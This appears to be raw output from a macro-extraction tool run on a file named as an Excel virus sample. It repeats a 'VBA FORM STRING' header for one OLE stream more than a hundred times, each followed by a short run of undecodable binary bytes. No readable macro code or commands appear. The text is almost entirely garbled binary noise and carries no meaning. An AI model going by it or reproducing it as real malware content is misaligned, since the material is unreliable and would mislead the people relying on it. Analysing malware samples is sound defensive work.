- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K+��yQL�-��K�?���g���Ґ$��$V^�2=����2ٮ0���e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,t��G�i�l���Nd3ܰ�,���ydN�+�3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
fb���I^<Y�H�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&Ggt,�P/����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�b�+"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`았��M��R\�?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1K��]W���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��g�G�p{\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S���ȣ�:�X��"�R�Ēo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��"d��� �y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�9�>��L�X?�o����m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0���<�tDT�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���i��E�q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w�Gim�z��5#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z=�L�u`@B$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�j^VFsn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��7R��

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��;:;�R�а�D�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������ن
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�a�7���B9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o$�f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���u���E;;̸q3���v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X�NH��Э��[��+6!o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1}0���[�����%B4qF~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����W�קhdh��'8}�T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����?��j�P�U�����rYx!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|�c�x�e~�LU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�W.��Ƽ�b��q����?<���L>��7j5>*W鑶E2�X�3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H&�}��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
zT�a�͍���Ugv�٦H�Q���#�C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~ZK'U���S�g�\~�Y�~U��W"n��)�OW8ƱpP<D2���@
��z�es
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Yx��D#�PS,�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!��sD3F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*؎d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C-��rE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�T�|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��/�<�Ⱦ���H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x�=���i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���%�*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ĳ���>�8e#X��z���漱Ԙ_�T�w+��V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���5C�}q���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�X�e��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@1qtsтр�So"��G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,��f{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:����3-���<R�5�F�U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~��"h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����˔�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Ǯ~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�2��8eY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��X�x�i�'�$�D5�դ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�voTI<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
94����{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c1� ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����Q��8|短`��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@p6)��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s����#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�yj�x
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I��ܐȸ����k��ض�G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��L��.�_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u��˝R?�8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M���Ã���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
łu1��L��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F�����#Wٜ㭉'�E�|��+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XuE*�$r���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d��K�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S��ԅ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	�ӵ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���u�S�!|��a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v�y���
�<�Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t\hF�X"�R���;�ƚ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X3Z;�D�d�hۉw�r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\^ˋ2�`P݆
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6E3-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Lk����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^V#���o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p�8�]��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�XaĲ�>���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��_��jF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s�Ws+)S�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�ȰO�mD%J�9%�|��ꂶV��uX�4�M���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|�sg7���o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��N�60�+��o~��g_SB#L�;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ܓ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.I��Ic�.0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
vId�^��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ԛŐ��b�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�L<�O�)(���>�NLsS���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7�x����<ۖ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$W�2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7���s���B�D��$Z����o��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'��6���(V��<��$|�L'� \��,�p�7e8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�q;X�3��BF����ߣ6��Q���y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��0��r����K�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[����>�ߖ{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Ӱ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*K�U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r��J��m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ׇ�bUȕ"ǐd��c_��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~��,��O���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Y3m�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�rS�S:��ܱʰlYi�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}X��&

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,߮o���,e�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S�{P$Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7��"�mu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����'�[gy�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��|���#f��#��݇�x����I3����^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1ɷ�nD0.�7��'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dm�>��V���T�Ȫ
